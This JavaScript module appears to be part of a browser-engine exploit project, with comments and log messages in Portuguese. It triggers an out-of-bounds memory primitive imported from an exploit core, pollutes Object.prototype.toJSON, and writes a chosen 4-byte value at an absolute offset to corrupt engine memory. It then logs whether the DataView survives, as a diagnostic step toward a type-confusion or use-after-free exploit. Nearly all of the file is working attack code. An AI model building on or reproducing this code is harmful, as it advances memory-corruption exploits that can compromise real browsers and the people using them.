// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
    oob_write_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

export let globalCallCount_toJSON_diag = 0; // Para a toJSON mínima

// toJSON mínima (V6_NoOp como referência)
function toJSON_MinimalForDiag() {
    globalCallCount_toJSON_diag++;
    // Não fazer nada ou log mínimo se necessário para confirmar que a PP ocorreu.
    // logS3(`[toJSON_MinimalForDiag] Chamada ${globalCallCount_toJSON_diag}`, "info");
    return { toJSON_minimal_diag_called: true };
}

export async function executeOOBWriteAndCheckPrimitive(
    testDescription,
    corruptionOffset,
    valueToWrite,
    applyPP // bool: aplicar PP ou não
) {
    const FNAME_TEST = `executeOOBWriteAndCheckPrimitive<${testDescription}>`;
    const ppKeyToPollute = 'toJSON';

    logS3(`--- Iniciando Teste de Diagnóstico Primitiva OOB: ${testDescription} ---`, "test", FNAME_TEST);
    logS3(`   Offset: ${toHex(corruptionOffset)}, Valor: ${toHex(valueToWrite)}, Aplicar PP: ${applyPP}`, "info", FNAME_TEST);
    document.title = `Iniciando: ${testDescription}`;

    globalCallCount_toJSON_diag = 0;
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha ao configurar ambiente OOB. Abortando.", "error", FNAME_TEST);
        document.title = "ERRO: Falha OOB Setup";
        return;
    }
    logS3(`CHECK ANTES PP/OOB_WRITE: typeof oob_array_buffer_real = ${typeof oob_array_buffer_real}, typeof oob_dataview_real = ${typeof oob_dataview_real}`, "info", FNAME_TEST);
    if(oob_dataview_real) logS3(`   oob_dataview_real.byteLength ANTES: ${oob_dataview_real.byteLength}`, "info", FNAME_TEST);


    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKeyToPollute);
    let pollutionAppliedThisRun = false;
    let stepReached = "antes_pp_check";

    try {
        if (applyPP) {
            logS3(`Aplicando PP com toJSON_MinimalForDiag...`, "info", FNAME_TEST);
            stepReached = "aplicando_pp";
            document.title = `Aplicando PP: ${testDescription}`;
            Object.defineProperty(Object.prototype, ppKeyToPollute, {
                value: toJSON_MinimalForDiag,
                writable: true, configurable: true, enumerable: false
            });
            pollutionAppliedThisRun = true;
            logS3(`Object.prototype.${ppKeyToPollute} poluído.`, "good", FNAME_TEST);
            stepReached = "pp_aplicada";
        } else {
            logS3(`PP DESABILITADA para este teste.`, "info", FNAME_TEST);
            stepReached = "pp_desabilitada";
        }
        document.title = `PP Status: ${applyPP} - ${testDescription}`;


        logS3(`CHECK ANTES OOB_WRITE (APÓS PP STATUS: ${applyPP}): typeof oob_array_buffer_real = ${typeof oob_array_buffer_real}, typeof oob_dataview_real = ${typeof oob_dataview_real}`, "info", FNAME_TEST);
        if(oob_dataview_real) logS3(`   oob_dataview_real.byteLength ANTES OOB_WRITE: ${oob_dataview_real.byteLength}`, "info", FNAME_TEST);
        else logS3(`   oob_dataview_real JÁ indefinido ANTES da escrita OOB!`, "error", FNAME_TEST);


        logS3(`CORRUPÇÃO: Escrevendo valor ${toHex(valueToWrite)} (4 bytes) em offset abs ${toHex(corruptionOffset)}`, "warn", FNAME_TEST);
        stepReached = "antes_escrita_oob";
        document.title = `Antes Escrita OOB: ${testDescription}`;
        oob_write_absolute(corruptionOffset, valueToWrite, 4);
        logS3("Escrita OOB realizada.", "info", FNAME_TEST);
        stepReached = "apos_escrita_oob";
        document.title = `Após Escrita OOB: ${testDescription}`;

        logS3(`CHECK IMEDIATAMENTE APÓS OOB_WRITE: typeof oob_array_buffer_real = ${typeof oob_array_buffer_real}, typeof oob_dataview_real = ${typeof oob_dataview_real}`, "critical", FNAME_TEST);
        if(oob_dataview_real) {
            logS3(`   oob_dataview_real.byteLength IMEDIATAMENTE APÓS: ${oob_dataview_real.byteLength}`, "critical", FNAME_TEST);
        } else {
            logS3(`   oob_dataview_real tornou-se UNDEFINED/NULL IMEDIATAMENTE APÓS a escrita OOB!`, "error", FNAME_TEST);
        }

        // Teste de leitura da oob_dataview_real
        try {
            logS3("Tentando leitura de controle da oob_dataview_real...", "info", FNAME_TEST);
            // Este é o ponto onde o erro "oob_dataview_real is not defined" ocorria
            let testRead = oob_dataview_real.getUint32(0, true);
            logS3(`Leitura de controle da oob_dataview_real (offset 0) retornou: ${toHex(testRead)}`, "good", FNAME_TEST);
            document.title = `Leitura DV OK: ${testDescription}`;
        } catch (e_dv) {
            logS3(`ERRO ao ler da oob_dataview_real: ${e_dv.name} - ${e_dv.message}`, "error", FNAME_TEST);
            document.title = `ERRO Leitura DV: ${testDescription}`;
        }

    } catch (mainError) {
        stepReached = "erro_principal";
        document.title = `ERRO Principal: ${testDescription}`;
        logS3(`Erro principal no teste (${testDescription}): ${mainError.message}`, "error", FNAME_TEST);
        console.error(mainError);
    } finally {
        if (pollutionAppliedThisRun) {
            if (originalToJSONDescriptor) {
                Object.defineProperty(Object.prototype, ppKeyToPollute, originalToJSONDescriptor);
            } else {
                delete Object.prototype[ppKeyToPollute];
            }
        }
        clearOOBEnvironment();
        logS3(`Ambiente OOB Limpo. Último passo alcançado: ${stepReached}`, "info", FNAME_TEST);
    }
    logS3(`--- Teste de Diagnóstico Primitiva OOB Concluído: ${testDescription} ---`, "test", FNAME_TEST);
    document.title = `Teste Concluído: ${testDescription}`;
}
